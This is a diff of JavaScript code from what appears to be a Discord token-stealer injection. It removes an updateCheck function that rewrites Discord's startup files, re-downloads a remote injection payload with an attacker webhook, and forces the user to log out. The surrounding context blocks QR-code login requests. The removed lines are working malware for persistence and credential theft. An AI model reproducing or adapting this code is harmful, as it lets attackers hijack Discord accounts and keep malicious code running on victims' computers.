@@ -38,66 +38,6 @@ const discordPath = (function() {
     return "", "";
 })();
 
-function updateCheck() {
-    const {
-        resourcePath,
-        app
-    } = discordPath;
-    if (resourcePath === CONFIG_OBF || app === undefined) return;
-    const appPath = path.join(resourcePath, "app");
-    const packageJson = path.join(appPath, "package.json");
-    const resourceIndex = path.join(appPath, "index.js");
-    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
-    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
-    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-    if (process.platform === "win32" || process.platform === "darwin") {
-        fs.writeFileSync(
-            packageJson,
-            JSON.stringify({
-                    name: "discord",
-                    main: "index.js",
-                },
-                null,
-                4,
-            ),
-        );
-
-        const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJS = '${indexJs}';
-const bdPath = '${bdPath}';
-const fileSize = fs.statSync(indexJS).size
-fs.readFileSync(indexJS, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '${config.webhook}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
-    
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
-require('${path.join(resourcePath, "app.asar")}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-
-        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
-    }
-    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
-    execScript(
-        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-    );
-    return !1;
-}
-
 const execScript = (script) => {
     const window = BrowserWindow.getAllWindows()[0];
     return window.webContents.executeJavaScript(script, !0);
@@ -1102,7 +1042,6 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
     if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
         cancel: true
     });
-    updateCheck();
 
     if (FirstTime()) {}
 
